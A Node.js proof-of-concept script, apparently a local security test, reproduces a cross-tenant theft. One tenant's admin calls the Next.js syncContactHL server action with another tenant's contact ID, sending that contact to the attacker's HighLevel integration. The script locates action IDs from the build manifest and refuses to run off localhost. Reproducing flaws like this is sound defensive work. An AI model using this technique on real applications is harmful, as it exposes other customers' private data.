// Reproduce el robo de un contacto ajeno por la acción syncContactHL. Solo en local.
//   node evals/intrusion/robo-contacto.mjs <estado-lab.json> <registro-externos.jsonl>

import { existsSync, readFileSync, rmSync } from "node:fs";

const [estado, registro] = process.argv.slice(2);
const lab = JSON.parse(readFileSync(estado, "utf8"));
if (!/^http:\/\/127\.0\.0\.1:/.test(lab.url)) throw new Error("Solo en local");
const BASE = "http://localhost:3101";
const cookie = (a) => `sb-127-auth-token=base64-${Buffer.from(JSON.stringify(a.session)).toString("base64url")}`;

// El atacante conecta su propio HighLevel, como cualquier cliente.
const conectar = await fetch(`${BASE}/api/workspace/${lab.b.id}/integrations`, {
  method: "PUT",
  headers: { cookie: cookie(lab.actors.bAdmin), "content-type": "application/json" },
  body: JSON.stringify({ provider: "highlevel", enabled: true, credentials: { highlevel_pit: "pit-falso" }, config: { location_id: "loc-falsa" } }),
});
console.log("1. Atacante conecta su HighLevel:", conectar.status);

// Compila la página para que exista el identificador de la acción.
await fetch(`${BASE}/inbox/${lab.b.conversationId}`, { headers: { cookie: cookie(lab.actors.bAdmin) } });
const manifiesto = JSON.parse(readFileSync(".next/dev/server/server-reference-manifest.json", "utf8"));
const candidatas = Object.entries(manifiesto.node ?? {}).filter(([, v]) => v.exportedName === "syncContactHL");
console.log("2. Acciones candidatas:", candidatas.length);

if (existsSync(registro)) rmSync(registro);
for (const [id] of candidatas) {
  const res = await fetch(`${BASE}/inbox`, {
    method: "POST",
    headers: {
      cookie: cookie(lab.actors.bAdmin),
      "content-type": "text/plain;charset=UTF-8",
      accept: "text/x-component",
      "next-action": id,
      origin: BASE,
    },
    body: JSON.stringify([lab.a.contactId, lab.b.id]),
  });
  console.log(`3. Acción ${id.slice(0, 10)}…:`, res.status, (await res.text()).split("\n").pop().slice(0, 120));
}

const salieron = existsSync(registro) ? readFileSync(registro, "utf8") : "";
console.log(
  salieron.includes("SECRETO-a")
    ? `ROBADO: el contacto de A salió hacia el HighLevel del atacante:\n${salieron.slice(0, 300)}`
    : "No salió ningún dato del cliente A.",
);
